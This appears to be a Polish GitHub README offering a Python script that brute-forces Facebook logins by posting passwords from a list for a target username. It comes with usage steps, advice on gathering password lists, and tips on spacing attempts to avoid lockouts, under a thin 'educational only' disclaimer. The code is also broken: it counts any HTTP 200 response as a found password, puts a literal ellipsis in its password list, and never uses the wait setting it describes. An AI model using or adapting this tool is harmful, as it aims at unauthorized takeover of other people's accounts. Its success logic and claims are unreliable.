

# Brute-force-
Brute force Facebook "używajcie w calch edukacji" nie ponoszę odpowiedźi
miłej zabawy wam życzę powodzenia w testach 
_____________________________________________



import requests
import time

def brute_force(username, password):
    url = "https://www.facebook.com/login.php"
    payload = {
        "email": username,
        "password": password,
        "login": "Log In"
    }
    response = requests.post(url, data=payload)

    if response.status_code == 200:
        print("Znaleziono hasło:", password)
        return True
    else:
        return False

def main():
    username = input("Podaj nazwę użytkownika: ")
    password_list = ["hasło1", "hasło2", "hasło3", ...]

    for password in password_list:
        if brute_force(username, password):
            break

    else:
        print("Nie znaleziono hasła.")

if __name__ == "__main__":
    main()





**UWAGA:** Ten program służy wyłącznie do celów edukacyjnych i testu bezpieczeństwa. Nie należy go wykorzystywać do innych celów 

**Opis działania programu:**

Program działa poprzez próbę logowania do konta Facebook podając różne kombinacje nazwy użytkownika i hasła. Najpierw użytkownik musi podać nazwę użytkownika, którą chce zaatakować. Następnie program przechodzi przez listę haseł i próbuje zalogować się z każdą kombinacją. Jeśli logowanie się powiedzie, program wydrukuje znalezione hasło. W przeciwnym razie program kontynuuje próbowanie kolejnych haseł.

**Ustawienia programu:**

Program można dostosować do własnych potrzeb, zmieniając następujące ustawienia:

* **Lista haseł:** Lista haseł, z których program będzie próbował korzystać. Listę można utworzyć ręcznie lub pobrać z zewnętrznego źródła.
* **Czas oczekiwania:** Czas oczekiwania między próbami logowania. Czas oczekiwania można ustawić, aby uniknąć blokady konta Facebook.

**Używanie programu:**

Aby użyć programu, należy wykonać następujące kroki:

1. Zainstaluj wymagane biblioteki.
2. Otwórz plik `brute_force.py` w edytorze tekstu.
3. Wprowadź nazwę użytkownika i listę haseł.
4. Zapisz plik i uruchom go.

**Ograniczenia programu:**

Program ma pewne ograniczenia:

* Program nie jest w 100% skuteczny. Istnieje możliwość, że program nie znajdzie hasła, nawet jeśli jest ono poprawne.
* Program może zostać zablokowany przez Facebooka. Jeśli program próbuje logować się zbyt wiele razy, Facebook może zablokować konto.


Aby móc testować konto za pomocą tego programu, należy podać następujące informacje:

* **Nazwa użytkownika:** Nazwa użytkownika konta, które chcesz zaatakować.
* **Lista haseł:** Lista haseł, z których program będzie próbował korzystać. Listę można utworzyć ręcznie lub pobrać z zewnętrznego źródła.

**Nazwa użytkownika**

Nazwa użytkownika to unikalny identyfikator konta Facebook. Możesz znaleźć nazwę użytkownika użytkownika, odwiedzając jego profil na Facebooku.

**Lista haseł**

Lista haseł to lista potencjalnych haseł, które użytkownik może używać do logowania się do swojego konta. Listę można utworzyć ręcznie, korzystając z popularnych słów, fraz lub kombinacji cyfr. Można również pobrać listę haseł z zewnętrznego źródła.

**Uwaga:**

Aby zwiększyć skuteczność programu, należy użyć listy haseł, która jest jak najbardziej aktualna i obejmuje szeroki zakres potencjalnych haseł.

**Przykład:**

Przykładowy sposób użycia programu do testowania konta Facebook:

```python
import requests
import time

def brute_force(username, password):
    url = "https://www.facebook.com/login.php"
    payload = {
        "email": username,
        "password": password,
        "login": "Log In"
    }
    response = requests.post(url, data=payload)

    if response.status_code == 200:
        print("Znaleziono hasło:", password)
        return True
    else:
        return False

def main():
    username = "example@example.com"
    password_list = ["hasło1", "hasło2", "hasło3", ...]

    for password in password_list:
        if brute_force(username, password):
            break

    else:
        print("Nie znaleziono hasła.")

if __name__ == "__main__":
    main()
```

W tym przykładzie nazwa użytkownika to `example@example.com`. Lista haseł to `hasło1`, `hasło2`, `hasło3`, ... Program będzie próbować logować się do konta Facebook, używając każdej kombinacji nazwy użytkownika i hasła z listy. Jeśli logowanie się powiedzie, program wydrukuje znalezione hasło. W przeciwnym razie program kontynuuje próbowanie kolejnych haseł.


**Uwagi końcowe:**

Program służy wyłącznie do celów edukacyjnych i testu bezpieczeństwa. Nie należy go wykorzystywać do nielegalnych działań.